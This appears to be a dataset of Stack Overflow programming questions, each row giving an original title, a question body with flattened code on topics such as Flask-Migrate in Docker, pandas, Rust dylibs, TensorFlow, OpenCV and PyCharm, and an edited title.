How to run flask_migrate in docker," I have a project with the following structure: My goal is to run migrations from the application directory to create tables in the database during docker-compose. Dockerfile docker-compose.yaml How can I do that? <code>  proj src application app.py manage.py migrations Dockerfile docker-compose.yaml python manage.py db upgrade FROM python:3.7-alpineADD requirements.txt /code/WORKDIR /codeRUN apk add --no-cache postgresql-dev gcc python3 musl-dev && \ pip3 install -r requirements.txtADD . /codeEXPOSE 5000WORKDIR /code/src/applicationCMD [""flask"", ""run"", ""--host=0.0.0.0""] ---version: ""3""services: web: links: - ""db"" build: . ports: - ""5000:5000"" volumes: - .:/code depends_on: - db env_file: - .env db: image: postgres:10 restart: always environment: - POSTGRES_USER=postgres - POSTGRES_PASSWORD=postgres - POSTGRES_DB=app ports: - ""5432:5432"" expose: - 5432",How to run flask_migrate in Docker
Pandas group the rows in a dataframe based on specified column value," I have the data frame as like below one, Now I need to group the dataframe based on the column values ""gw_mac"" and ""mac"" and I should get the following three different groups <code>  Input DataFrame gw_mac mac 0 ac233fc015f6 dce83f3bc820 1 ac233fc015f6 ac233f264a4c 2 ac233fc015f6 ac233f264a4c 3 ac233fc015f6 dce83f3bc820 4 ac233fc015f6 ac233f264a4c 5 ac233fc015f6 ac233f264a4c 6 ac233fc015f6 dce83f3bc820 7 ac233fc015f6 e464eecba5eb Expected OutputGroup1 gw_mac mac 0 ac233fc015f6 dce83f3bc820 3 ac233fc015f6 dce83f3bc820 6 ac233fc015f6 dce83f3bc820Group2 gw_mac mac 1 ac233fc015f6 ac233f264a4c 2 ac233fc015f6 ac233f264a4c 4 ac233fc015f6 ac233f264a4c 5 ac233fc015f6 ac233f264a4cGroup3 gw_mac mac 7 ac233fc015f6 e464eecba5eb",Pandas group the rows in a dataframe based on specific column value
dylib cannot load libstd when compiled from a workspace in rust," I have a project with the following structure: Where:my_lib is a Rust library with crate-type = [""dylib""]my_bin is a Rust binary application using my_libmy_script.py is a Python 3 script that also uses my_libThe root Cargo.toml contains a basic workspace declaration: Everything works properly if I execute cargo build and cargo run -p my_bin. The problem comes with the Python script.In this script, I load the my_lib lib file using the following code: If I use the library file from the library directory (./my_lib/target/...), the script has no problem loading the library and executing its functions.But if I use the library file from the workspace directory (./target/...) I get the following error when trying to load the library: In the same fashion, trying to execute my_bin directly from the workspace target directory yields the same error (even though cargo run -p my_bin work flawlessly).Using the software ""Dependency Walker"", I found that the my_lib library cannot find the Rust libstd library (has the previous error message explain).Manually exporting the path that contains the Rust toolchain library into the environment PATH fixes the issue. This is however far from ideal and not portable. I also don't understand why this issue is only occurring when using the workspace target.So, why can't the workspace target find rust's libstd when each project target can? Is there a way to fix this issue that wouldn't require to find the toolchain path and modify an environment variable? <code>  Cargo.tomlmy_script.pymy_lib: - Cargo.toml - srcmy_bin: - Cargo.toml - src [workspace]members = [ ""my_lib"", ""my_bin""] from ctypes import cdllfrom sys import platformif platform == 'darwin': prefix = 'lib' ext = 'dylib'elif platform == 'win32': prefix = '' ext = 'dll'else: prefix = 'lib' ext = 'so'# Working path:# lib_path = './my_lib/target/debug/{}my_lib.{}'.format(prefix, ext)# Buggy ""Library not loaded: @rpath/libstd-d00eaa6834e55536.dylib"" path:lib_path = './target/debug/{}my_lib.{}'.format(prefix, ext)lib = cdll.LoadLibrary(lib_path)my_func = lib.my_funcmy_func() OSError: dlopen(./target/debug/libpeglrs.dylib, 6): Library not loaded: @rpath/libstd-d00eaa6834e55536.dylib",dylib cannot load libstd when compiled in a workspace
dylib cannot load Rust's libstd when compiled in a workspace," I have a project with the following structure: Where:my_lib is a Rust library with crate-type = [""dylib""]my_bin is a Rust binary application using my_libmy_script.py is a Python 3 script that also uses my_libThe root Cargo.toml contains a basic workspace declaration: Everything works properly if I execute cargo build and cargo run -p my_bin. The problem comes with the Python script.In this script, I load the my_lib lib file using the following code: If I use the library file from the library directory (./my_lib/target/...), the script has no problem loading the library and executing its functions.But if I use the library file from the workspace directory (./target/...) I get the following error when trying to load the library: In the same fashion, trying to execute my_bin directly from the workspace target directory yields the same error (even though cargo run -p my_bin work flawlessly).Using the software ""Dependency Walker"", I found that the my_lib library cannot find the Rust libstd library (has the previous error message explain).Manually exporting the path that contains the Rust toolchain library into the environment PATH fixes the issue. This is however far from ideal and not portable. I also don't understand why this issue is only occurring when using the workspace target.So, why can't the workspace target find rust's libstd when each project target can? Is there a way to fix this issue that wouldn't require to find the toolchain path and modify an environment variable? <code>  Cargo.tomlmy_script.pymy_lib: - Cargo.toml - srcmy_bin: - Cargo.toml - src [workspace]members = [ ""my_lib"", ""my_bin""] from ctypes import cdllfrom sys import platformif platform == 'darwin': prefix = 'lib' ext = 'dylib'elif platform == 'win32': prefix = '' ext = 'dll'else: prefix = 'lib' ext = 'so'# Working path:# lib_path = './my_lib/target/debug/{}my_lib.{}'.format(prefix, ext)# Buggy ""Library not loaded: @rpath/libstd-d00eaa6834e55536.dylib"" path:lib_path = './target/debug/{}my_lib.{}'.format(prefix, ext)lib = cdll.LoadLibrary(lib_path)my_func = lib.my_funcmy_func() OSError: dlopen(./target/debug/libpeglrs.dylib, 6): Library not loaded: @rpath/libstd-d00eaa6834e55536.dylib",dylib cannot load libstd when compiled in a workspace
"Maximum sum of subsequence of length L, which has a distance between elem no more K"," Given an array of positive integers. How to find a subsequence of length L with max sum which has the distance between any two of its neighboring elements that do not exceed KI have the following solution but don't know how to take into account length L. 1 <= N <= 100000, 1 <= L <= 200, 1 <= K <= Nf[i] contains max sum of the subsequence that ends in i. <code>  for i in range(K, N) f[i] = INT_MIN for j in range(1, K+1) f[i] = max(f[i], f[i-j] + a[i])return max(f)",Maximum sum of subsequence of length L with a restriction
Bulk Upset with SQLAlchemy Postgres," I'm following the SQLAlchemy documentation here to write a bulk upsert statement with Postgres. For demonstration purposes, I have a simple table MyTable: Creating a generic insert statement is simple enough: The problem I run into is when I try to add the ""on conflict"" part of the upsert. Trying to execute this statement yields a ProgrammingError: I think my misunderstanding is in constructing the statement with the on_conflict_do_update method. Does anyone know how to construct this statement? I have looked at other questions on StackOverflow (eg. here) but I can't seem to a way to address the above error. <code>  class MyTable(base): __tablename__ = 'mytable' id = Column(types.Integer, primary_key=True) test_value = Column(types.Text) from sqlalchemy.dialects import postgresqlvalues = [{'id': 0, 'test_value': 'a'}, {'id': 1, 'test_value': 'b'}]insert_stmt = postgresql.insert(MyTable.__table__).values(values) update_stmt = insert_stmt.on_conflict_do_update( index_elements=[MyTable.id], set_=dict(data=values)) from sqlalchemy import create_engineengine = create_engine('postgres://localhost/db_name')engine.execute(update_stmt)>>> ProgrammingError: (psycopg2.ProgrammingError) can't adapt type 'dict'",Bulk Upsert with SQLAlchemy Postgres
How to choose randomly between 2 values," So basically I'm trying to get a piece of code to randomly choose between two values -40 and 40. To do so, I was thinking of using good old mathematics like - random_num = ((-1)^value)*40, where value = {1, 2}. random_num, as the name suggest should be a random number.Any help ? I am using python, solution using libraries is acceptable. <code> ",How to choose randomly between two values?
Pythonic method to move up n directories," I'm looking for a pythonic way to move up n directories from a given directory.Let's say we have the example path /data/python_env/lib/python3.6/site-packages/matplotlib/mpl-data. If we were to move up n=2 directories we should end up at /data/python_env/lib/python3.6/site-packages.The following works to move up n directories: However, it's not very readable and fails for paths on windows machines. In essence, it doesn't feel a very pythonic solution.Is there a better, more pythonic solution, maybe using the os module? <code>  up_n = lambda path, n: '/'.join(path.split('/')[:-n])",How to move up n directories in Pythonic way?
Is this the approved way to get data adjacent to a Python script?," I have a Python script that needs some data that's stored in a file that will always be in the same location as the script. I have a setup.py for the script, and I want to make sure it's pip installable in a wide variety of environments, and can be turned into a standalone executable if necessary.Currently the script runs with Python 2.7 and Python 3.3 or higher (though I don't have a test environment for 3.3 so I can't be sure about that).I came up with this method to get the data. This script isn't part of a module directory with __init__.py or anything, it's just a standalone file that will work if just run with python directly, but also has an entry point defined in the setup.py file. It's all one file. Is this the correct way? This seems ridiculously complex. Also, it seems to rely on the package management system in ways I'm uncomfortable with. The script no longer works unless it's been pip-installed, and that also doesn't seem desirable. <code>  def fetch_wordlist(): wordlist = 'wordlist.txt' try: import importlib.resources as res return res.read_binary(__file__, wordlist) except ImportError: pass try: import pkg_resources as resources req = resources.Requirement.parse('makepw') wordlist = resources.resource_filename(req, wordlist) except ImportError: import os.path wordlist = os.path.join(os.path.dirname(__file__), wordlist) with open(wordlist, 'rb') as f: return f.read()",Is this the approved way to acess data adjacent to/packaged with a Python script?
TF2 dataset.__iter__() is only supported when eager execution is enabled," I'm using the following custom training code in TensorFlow 2: This code gives me the error: However, it's in TensorFlow 2.0 so eager is enabled by default.tf.executing_eagerly() also returns 'True'. <code>  def parse_function(filename, filename2): image = read_image(fn) def ret1(): return image, read_image(fn2), 0 def ret2(): return image, preprocess(image), 1 return tf.case({tf.less(tf.random.uniform([1])[0], tf.constant(0.5)): ret2}, default=ret1)dataset = tf.data.Dataset.from_tensor_slices((train,shuffled_train))dataset = dataset.shuffle(len(train))dataset = dataset.map(parse_function, num_parallel_calls=4)dataset = dataset.batch(1)dataset = dataset.prefetch(buffer_size=4)@tf.functiondef train(model, dataset, optimizer): for x1, x2, y in enumerate(dataset): with tf.GradientTape() as tape: left, right = model([x1, x2]) loss = contrastive_loss(left, right, tf.cast(y, tf.float32)) gradients = tape.gradient(loss, model.trainable_variables) optimizer.apply_gradients(zip(gradients, model.trainable_variables))siamese_net.compile(optimizer=tf.keras.optimizers.RMSprop(learning_rate=1e-3))train(siamese_net, dataset, tf.keras.optimizers.RMSprop(learning_rate=1e-3)) dataset.__iter__() is only supported when eager execution is enabled.",TensorFlow 2.0 dataset.__iter__() is only supported when eager execution is enabled
Conv1D with kernel_size=1 interpretation," I'm working on very sparse vectors as input. I started working with simple Linear (dense/fully connected layers) and my network yielded pretty good results (let's take accuracy as my metric here, 95.8%).I later tried to use a Conv1d with a kernel_size=1 and a MaxPool1d, and this network works slightly better (96.4% accuracy).Question: How are these two implementation different ? Shouldn't a Conv1d with a unit kernel_size do the same as a Linear layer?I've tried multiple runs, the CNN always yields slightly better results. <code> ",Conv1D with kernel_size=1 vs Linear layer
"How to disable a ""Reload site"" popup for (python) selenium tests in chrome?"," I am running automated (python) selenium tests on a chrome browser, and sometimes when a page is reloaded a popup appears on the screeen:Is it possible to configure the chrome selenium browser in such a way, that this popup does not appear? If so, how to do that? Or are there other ways to supress this popup? Or to accept it? <code> ","How to disable a ""Reload site? Changes you made may not be saved"" popup for (python) selenium tests in chrome?"
How to stop gradient boositng machine from overfitting?," I am comparing a few models (gradient boosting machine, random forest, logistic regression, SVM, multilayer perceptron, and keras neural network) on a multiclassification problem. I have used nested cross validation and grid search on my models, running these on my actual data and also randomised data to check for overfitting. However, for the gradient boosting machine I am finding, no matter how I change my data or model parameters, it is giving me 100% accuracy on the random data every time. Is there something in my code that could be causing this?Here is my code: Output: Random data code: Random data output: This gradient boosting classifier (GBM) is at 100% whether I reduce the number of features, change the parameters in the grid search (I do put in multiple parameters however this can run for hours for me without results so I have left that problem for now), and is also the same if I try binary classification data.The random forest (RFC) is also higher at 62%, is there something I am doing wrong?The data I am using is predominantly binary features, as an example looking like this (and predicting the category column): Any guidance would be appreciated. <code>  dataset= pd.read_csv('data.csv')data = dataset.drop([""gene""],1)df = data.iloc[:,0:26]df = df.fillna(0)X = MinMaxScaler().fit_transform(df)le = preprocessing.LabelEncoder()encoded_value = le.fit_transform([""certain"", ""likely"", ""possible"", ""unlikely""])Y = le.fit_transform(data[""category""])sm = SMOTE(random_state=100)X_res, y_res = sm.fit_resample(X, Y)seed = 7logreg = LogisticRegression(penalty='l1', solver='liblinear',multi_class='auto')LR_par= {'penalty':['l1'], 'C': [0.5, 1, 5, 10], 'max_iter':[100, 200, 500, 1000]}rfc =RandomForestClassifier(n_estimators=500)param_grid = {""max_depth"": [3], ""max_features"": [""auto""], ""min_samples_split"": [2], ""min_samples_leaf"": [1], ""bootstrap"": [False], ""criterion"": [""entropy"", ""gini""]}mlp = MLPClassifier(random_state=seed)parameter_space = {'hidden_layer_sizes': [(50,50,50)], 'activation': ['relu'], 'solver': ['adam'], 'max_iter': [10000], 'alpha': [0.0001], 'learning_rate': ['constant']}gbm = GradientBoostingClassifier()param = {""loss"":[""deviance""], ""learning_rate"": [0.001], ""min_samples_split"": [2], ""min_samples_leaf"": [1], ""max_depth"":[3], ""max_features"":[""auto""], ""criterion"": [""friedman_mse""], ""n_estimators"":[50] }svm = SVC(gamma=""scale"")tuned_parameters = {'kernel':('linear', 'rbf'), 'C':(1,0.25,0.5,0.75)}inner_cv = KFold(n_splits=10, shuffle=True, random_state=seed)outer_cv = KFold(n_splits=10, shuffle=True, random_state=seed)def baseline_model(): model = Sequential() model.add(Dense(100, input_dim=X_res.shape[1], activation='relu')) #dense layers perform: output = activation(dot(input, kernel) + bias). model.add(Dropout(0.5)) model.add(Dense(50, activation='relu')) #8 is the dim/ the number of hidden units (units are the kernel) model.add(Dense(4, activation='softmax')) model.compile(loss='categorical_crossentropy', optimizer='adam', metrics=['accuracy']) return modelmodels = []models.append(('GBM', GridSearchCV(gbm, param, cv=inner_cv,iid=False, n_jobs=1)))models.append(('RFC', GridSearchCV(rfc, param_grid, cv=inner_cv,iid=False, n_jobs=1)))models.append(('LR', GridSearchCV(logreg, LR_par, cv=inner_cv, iid=False, n_jobs=1)))models.append(('SVM', GridSearchCV(svm, tuned_parameters, cv=inner_cv, iid=False, n_jobs=1)))models.append(('MLP', GridSearchCV(mlp, parameter_space, cv=inner_cv,iid=False, n_jobs=1)))models.append(('Keras', KerasClassifier(build_fn=baseline_model, epochs=100, batch_size=50, verbose=0)))results = []names = []scoring = 'accuracy'X_train, X_test, Y_train, Y_test = train_test_split(X_res, y_res, test_size=0.2, random_state=0)for name, model in models: nested_cv_results = model_selection.cross_val_score(model, X_res, y_res, cv=outer_cv, scoring=scoring) results.append(nested_cv_results) names.append(name) msg = ""Nested CV Accuracy %s: %f (+/- %f )"" % (name, nested_cv_results.mean()*100, nested_cv_results.std()*100) print(msg) model.fit(X_train, Y_train) print('Test set accuracy: {:.2f}'.format(model.score(X_test, Y_test)*100), '%') Nested CV Accuracy GBM: 90.952381 (+/- 2.776644 )Test set accuracy: 90.48 %Nested CV Accuracy RFC: 79.285714 (+/- 5.112122 )Test set accuracy: 75.00 %Nested CV Accuracy LR: 91.904762 (+/- 4.416009 )Test set accuracy: 92.86 %Nested CV Accuracy SVM: 94.285714 (+/- 3.563483 )Test set accuracy: 96.43 %Nested CV Accuracy MLP: 91.428571 (+/- 4.012452 )Test set accuracy: 92.86 % ran = np.random.randint(4, size=161)random = np.random.normal(500, 100, size=(161,161))rand = np.column_stack((random, ran))print(rand.shape)X1 = rand[:161]Y1 = rand[:,-1]print(""Random data counts of label '1': {}"".format(sum(ran==1)))print(""Random data counts of label '0': {}"".format(sum(ran==0)))print(""Random data counts of label '2': {}"".format(sum(ran==2)))print(""Random data counts of label '3': {}"".format(sum(ran==3)))for name, model in models: cv_results = model_selection.cross_val_score(model, X1, Y1, cv=outer_cv, scoring=scoring) names.append(name) msg = ""Random data CV %s: %f (+/- %f)"" % (name, cv_results.mean()*100, cv_results.std()*100) print(msg) Random data CV GBM: 100.000000 (+/- 0.000000)Random data CV RFC: 62.941176 (+/- 15.306485)Random data CV LR: 23.566176 (+/- 6.546699)Random data CV SVM: 22.352941 (+/- 6.331220)Random data CV MLP: 23.639706 (+/- 7.371392)Random data CV Keras: 22.352941 (+/- 8.896451) gene Tissue Druggable Eigenvalue CADDvalue Catalogpresence CategoryACE 1 1 1 0 1 CertainABO 1 0 0 0 0 LikelyTP53 1 1 0 0 0 Possible",How to stop gradient boosting machine from overfitting?
Pandas return the next Sunday for every row (Python)," In Pandas for Python, I have a data set that has a column of datetimes in it. I need to create a new column that has the date of the following Sunday for each row. I've tried various methods trying to use iterrows and then figure out the day of the week, and add a day until the day is 7, but it hasn't worked and I'm not even sure how I'd return the date instead of just the day number then. I also don't feel like iterrows would be the best way to do it either.What is the best way to return a column of the following Sunday from a date column?  <code> ",Pandas return the next Sunday for every row
How to install google cloud for python using anaconda?," Google Cloud AutoML has python example code for detection, but I have error when importing these modules It says cannot import name automl_v1beta1. I know it's a common problem and there are many solutions on internet but nothing has worked so far. I'm using Windows 10 and run python 2.7 on Anaconda environment. I tried these, but nothing worked : <code>  from google.cloud import automl_v1beta1from google.cloud.automl_v1beta1.proto import service_pb2 conda install -c conda-forge google-cloud-sdkconda install -c conda-forge google-cloud-storage python -m pip install google-cloudpip install google-cloud-automl",How to install google.cloud automl_v1beta1 for python using anaconda?
Need to Retrieve only Checkbox contours using OpenCV," I have several images for which I need to do OMR by detecting checkboxes using computer vision.I'm using findContours to draw contours only on the checkboxes in scanned document. But the algorithm extracts each and every contours of the text. Input Image: <code>  from imutils.perspective import four_point_transformfrom imutils import contoursimport numpy as npimport argparse, imutils, cv2, matplotlibimport matplotlib.pyplot as pltimport matplotlib.image as mpimgimage = cv2.imread(""1.jpg"")gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)blurred = cv2.GaussianBlur(gray, (5, 5), 0)edged = cv2.Canny(blurred, 75, 200)im_test = [blurred, cv2.GaussianBlur(gray, (7, 7), 0), cv2.GaussianBlur(gray, (5, 5), 5), cv2.GaussianBlur(gray, (11, 11), 0)]im_thresh = [ cv2.threshold(i, 127, 255, 0) for i in im_test ]im_thresh_0 = [i[1] for i in im_thresh ]im_cnt = [cv2.findContours(thresh, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)[0] for thresh in im_thresh_0]im_drawn = [cv2.drawContours(image.copy(), contours, -1, (0,255,0), 1) for contours in im_cnt]plt.imshow(im_drawn[0])plt.show()",Find checkbox contours using OpenCV
How to detect/find Checkbox contours using OpenCV," I have several images for which I need to do OMR by detecting checkboxes using computer vision.I'm using findContours to draw contours only on the checkboxes in scanned document. But the algorithm extracts each and every contours of the text. Input Image: <code>  from imutils.perspective import four_point_transformfrom imutils import contoursimport numpy as npimport argparse, imutils, cv2, matplotlibimport matplotlib.pyplot as pltimport matplotlib.image as mpimgimage = cv2.imread(""1.jpg"")gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)blurred = cv2.GaussianBlur(gray, (5, 5), 0)edged = cv2.Canny(blurred, 75, 200)im_test = [blurred, cv2.GaussianBlur(gray, (7, 7), 0), cv2.GaussianBlur(gray, (5, 5), 5), cv2.GaussianBlur(gray, (11, 11), 0)]im_thresh = [ cv2.threshold(i, 127, 255, 0) for i in im_test ]im_thresh_0 = [i[1] for i in im_thresh ]im_cnt = [cv2.findContours(thresh, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)[0] for thresh in im_thresh_0]im_drawn = [cv2.drawContours(image.copy(), contours, -1, (0,255,0), 1) for contours in im_cnt]plt.imshow(im_drawn[0])plt.show()",Find checkbox contours using OpenCV
How to detect/find checkbox contours using OpenCV," I have several images for which I need to do OMR by detecting checkboxes using computer vision.I'm using findContours to draw contours only on the checkboxes in scanned document. But the algorithm extracts each and every contours of the text. Input Image: <code>  from imutils.perspective import four_point_transformfrom imutils import contoursimport numpy as npimport argparse, imutils, cv2, matplotlibimport matplotlib.pyplot as pltimport matplotlib.image as mpimgimage = cv2.imread(""1.jpg"")gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)blurred = cv2.GaussianBlur(gray, (5, 5), 0)edged = cv2.Canny(blurred, 75, 200)im_test = [blurred, cv2.GaussianBlur(gray, (7, 7), 0), cv2.GaussianBlur(gray, (5, 5), 5), cv2.GaussianBlur(gray, (11, 11), 0)]im_thresh = [ cv2.threshold(i, 127, 255, 0) for i in im_test ]im_thresh_0 = [i[1] for i in im_thresh ]im_cnt = [cv2.findContours(thresh, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)[0] for thresh in im_thresh_0]im_drawn = [cv2.drawContours(image.copy(), contours, -1, (0,255,0), 1) for contours in im_cnt]plt.imshow(im_drawn[0])plt.show()",Find checkbox contours using OpenCV
Increase speed of rolling window in pandas," I'm using this code to apply a function (funcX) on my data-frame using a rolling window. The main issue is that the size of this data-frame (data) is very large, and I'm searching for a faster way to do this task. The only reason for using this function is that the calculated median is the median after removing the middle value. So it's different with adding .median() at the end of the rolling window. <code>  import numpy as npdef funcX(x): x = np.sort(x) xd = np.delete(x, 25) med = np.median(xd) return (np.abs(x - med)).mean() + medmed_out = data.var1.rolling(window = 51, center = True).apply(funcX, raw = True)",Pandas: increase speed of rolling window (apply a custom function)
Increase speed of rolling window in pandas," I'm using this code to apply a function (funcX) on my data-frame using a rolling window. The main issue is that the size of this data-frame (data) is very large, and I'm searching for a faster way to do this task. The only reason for using this function is that the calculated median is the median after removing the middle value. So it's different with adding .median() at the end of the rolling window. <code>  import numpy as npdef funcX(x): x = np.sort(x) xd = np.delete(x, 25) med = np.median(xd) return (np.abs(x - med)).mean() + medmed_out = data.var1.rolling(window = 51, center = True).apply(funcX, raw = True)",Pandas: increase speed of rolling window (apply a custom function)
Pandas: increase speed of rolling window," I'm using this code to apply a function (funcX) on my data-frame using a rolling window. The main issue is that the size of this data-frame (data) is very large, and I'm searching for a faster way to do this task. The only reason for using this function is that the calculated median is the median after removing the middle value. So it's different with adding .median() at the end of the rolling window. <code>  import numpy as npdef funcX(x): x = np.sort(x) xd = np.delete(x, 25) med = np.median(xd) return (np.abs(x - med)).mean() + medmed_out = data.var1.rolling(window = 51, center = True).apply(funcX, raw = True)",Pandas: increase speed of rolling window (apply a custom function)
Pandas: increase speed of rolling window (apply a function)," I'm using this code to apply a function (funcX) on my data-frame using a rolling window. The main issue is that the size of this data-frame (data) is very large, and I'm searching for a faster way to do this task. The only reason for using this function is that the calculated median is the median after removing the middle value. So it's different with adding .median() at the end of the rolling window. <code>  import numpy as npdef funcX(x): x = np.sort(x) xd = np.delete(x, 25) med = np.median(xd) return (np.abs(x - med)).mean() + medmed_out = data.var1.rolling(window = 51, center = True).apply(funcX, raw = True)",Pandas: increase speed of rolling window (apply a custom function)
pipenv - reusing existing virtualenvs," I started looking at pipenv and it seems to be pretty good. My only concern is, that most of my projects involve numpy, scipy and some other not-so-small libraries. The current way manage my projects:I have pyenv and pyenv-virtualenv installed. I have a few (currently 4) specific virtualenvs that each cater to a type of project. The projects themselves have .pyenv-version set, I have the autoload virtualenv feature of pyenv enabled. If I need to share a project, I generate a requirements.txt with pip freeze -l from the virtualenv.So in my current setup, I have X number of projects and Y, Y << X number of virtualenvs, all amounting to a few GB of harddisk space. Note that because of large libraries like numpy each of the virtualenvs are pretty big, around 700-900 MB.My question:As far as I understand, pipenv will, by default create a virtualenv for all of my projects, so the harddisk space taken up by my virtualenvs would increase considerably. What I'm interested in is:is it possible to share pipenv environments across several projects, that use exactly the same dependencies? i.e. multiple pipenv configs that load the same virtualenv?if not, is it possible to generate pipenv config files from a virtualenv I set up with pyenv? i.e. I would not use pipenv to actually run my projects, I would not create any virtualenvs with pipenv, but I would create pipenv config files for sharing the project (in this case, probably along side a requirements.txt as well).edit:I rewrote most of the question to make it clearer. <code> ","Keeping the same, shared virtualenvs when switching from pyenv-virtualenv to pipenv"
Validation error ... Member must satisfy regular expression pattern: arn:aws:iam::," I'm trying to stream rds through kinesis data stream but it is giving me this error: botocore.exceptions.ClientError: An error occurred (ValidationException) when calling the PutRecord operation: 1 validation error detected: Value 'arn:aws:kinesis:us-west-2:xxxxxxxxxx:stream/rds-temp-leads-stream' at 'streamName' failed to satisfy constraint: Member must satisfy regular expression pattern: [a-zA-Z0-9_.-]+What can I do to fix this? <code>  import jsonimport boto3from datetime import datetimefrom pymysqlreplication import BinLogStreamReaderfrom pymysqlreplication.row_event import ( DeleteRowsEvent, UpdateRowsEvent, WriteRowsEvent,)class DateTimeEncoder(json.JSONEncoder): def default(self, o): if isinstance(o, datetime): return o.isoformat() return json.JSONEncoder.default(self, o)def main(): mysql = { ""host"": """", ""port"":, ""user"": """", ""passwd"": """", ""db"": """"} kinesis = boto3.client(""kinesis"", region_name = 'us-west-2') stream = BinLogStreamReader( connection_settings = mysql, server_id=100, blocking = True, log_file='mysql-bin.000003', resume_stream=True, only_events=[DeleteRowsEvent, WriteRowsEvent, UpdateRowsEvent]) for binlogevent in stream: for row in binlogevent.rows: print row event = {""schema"": binlogevent.schema, ""table"": binlogevent.table, ""type"": type(binlogevent).__name__, ""row"": row } kinesis.put_record(StreamName=""jhgjh"", Data=json.dumps(event, cls=DateTimeEncoder), PartitionKey=""default"") #print json.dumps(event)if __name__ == ""__main__"": main()",Terraform: Validation error ... Member must satisfy regular expression pattern: arn:aws:iam::
Python: What does a yield inside a yield do?," Consider the following code: The output yields: What does the interpreter do at the ""outside"" yield exactly? <code>  def mygen(): yield (yield 1)a = mygen()print(next(a))print(next(a)) 1None",What does a yield inside a yield do?
How to avoid Pycharm console crash when plotting with matplotlib?," In PyCharm, when I try to plot something using its interactive console, such as: It opens a window and crashes. I have to stop the console and start a new one. It works fine when I run anything like that in an ipython console in my terminal, the error happens only in Pycharm, it seems.On the other hand, if import matplotlib with import matplotlib.pyplot as plt it works fine: But if I do both, it crashes too (even calling the plot function using plt.plot): Furthermore, when I run it all in one command, it works the first time. But if I try to plot another time, it crashes: So it is something related with using the matplotlib library with the import using * and with running in the interactive console after the first time it was imported. I know the wildcard import is not recommended, but sometimes it is useful to do it for a sake of testing things faster and being less verbose. Looking for this warning online, I have only found thesehttps://github.com/matplotlib/matplotlib/issues/13296But my case doesn't seem to be related to multiprocessing. And even if pycharm is doing something behind the scenes, I wonder why it has changed, as I had no problems with this like a month ago;Suppress warning ""QApplication was not created in main() thread""and other posts related to C++, which is not my case;WARNING: QApplication was not created in main() thread -> related to pycharm, but has an additional error different than mineWhich didn't help much. Anyone knows what is happening and how to solve it?SPECS:PyCharm 2019.1.2 (Professional Edition) Build #PY-191.7141.48, built on May 7, 2019JRE: 11.0.2+9-b159.56 amd64JVM: OpenJDK 64-Bit Server VM by JetBrains s.r.oLinux 4.15.0-50-genericconda 4.6.14, with Python 3.7.3Qt5 <code>  In[2]: from matplotlib.pyplot import *In[3]: x = range(5)In[4]: y = range(5,10)In[5]: plot(x,y)WARNING: QApplication was not created in the main() thread.Out[5]: [<matplotlib.lines.Line2D at 0x7fade916a438>]In[6]: show() In[2]: import matplotlib.pyplot as pltIn[3]: x = range(5)In[4]: y = range(5,10)In[5]: plt.plot(x,y)Out[5]: [<matplotlib.lines.Line2D at 0x7fd3453b72e8>]In[6]: plt.show() In[2]: from matplotlib.pyplot import *In[3]: import matplotlib.pyplot as pltIn[4]: x = range(5)In[5]: y = range(5,10)In[6]: plt.plot(x,y)WARNING: QApplication was not created in the main() thread.Out[6]: [<matplotlib.lines.Line2D at 0x7fade916a438>]In[7]: plt.show() In[2]: from matplotlib.pyplot import * ...: x = range(5) ...: y = range(5,10) ...: plot(x,y) ...: show()In[3]: plot(x,y)WARNING: QApplication was not created in the main() thread.Out[3]: [<matplotlib.lines.Line2D at 0x7fc68a3009e8>]In[4]: show()","How to avoid PyCharm console crash ""WARNING: QApplication was not created in the main() thread"" when plotting with matplotlib?"
How to avoid PyCharm console crash when plotting with matplotlib?," In PyCharm, when I try to plot something using its interactive console, such as: It opens a window and crashes. I have to stop the console and start a new one. It works fine when I run anything like that in an ipython console in my terminal, the error happens only in Pycharm, it seems.On the other hand, if import matplotlib with import matplotlib.pyplot as plt it works fine: But if I do both, it crashes too (even calling the plot function using plt.plot): Furthermore, when I run it all in one command, it works the first time. But if I try to plot another time, it crashes: So it is something related with using the matplotlib library with the import using * and with running in the interactive console after the first time it was imported. I know the wildcard import is not recommended, but sometimes it is useful to do it for a sake of testing things faster and being less verbose. Looking for this warning online, I have only found thesehttps://github.com/matplotlib/matplotlib/issues/13296But my case doesn't seem to be related to multiprocessing. And even if pycharm is doing something behind the scenes, I wonder why it has changed, as I had no problems with this like a month ago;Suppress warning ""QApplication was not created in main() thread""and other posts related to C++, which is not my case;WARNING: QApplication was not created in main() thread -> related to pycharm, but has an additional error different than mineWhich didn't help much. Anyone knows what is happening and how to solve it?SPECS:PyCharm 2019.1.2 (Professional Edition) Build #PY-191.7141.48, built on May 7, 2019JRE: 11.0.2+9-b159.56 amd64JVM: OpenJDK 64-Bit Server VM by JetBrains s.r.oLinux 4.15.0-50-genericconda 4.6.14, with Python 3.7.3Qt5 <code>  In[2]: from matplotlib.pyplot import *In[3]: x = range(5)In[4]: y = range(5,10)In[5]: plot(x,y)WARNING: QApplication was not created in the main() thread.Out[5]: [<matplotlib.lines.Line2D at 0x7fade916a438>]In[6]: show() In[2]: import matplotlib.pyplot as pltIn[3]: x = range(5)In[4]: y = range(5,10)In[5]: plt.plot(x,y)Out[5]: [<matplotlib.lines.Line2D at 0x7fd3453b72e8>]In[6]: plt.show() In[2]: from matplotlib.pyplot import *In[3]: import matplotlib.pyplot as pltIn[4]: x = range(5)In[5]: y = range(5,10)In[6]: plt.plot(x,y)WARNING: QApplication was not created in the main() thread.Out[6]: [<matplotlib.lines.Line2D at 0x7fade916a438>]In[7]: plt.show() In[2]: from matplotlib.pyplot import * ...: x = range(5) ...: y = range(5,10) ...: plot(x,y) ...: show()In[3]: plot(x,y)WARNING: QApplication was not created in the main() thread.Out[3]: [<matplotlib.lines.Line2D at 0x7fc68a3009e8>]In[4]: show()","How to avoid PyCharm console crash ""WARNING: QApplication was not created in the main() thread"" when plotting with matplotlib?"
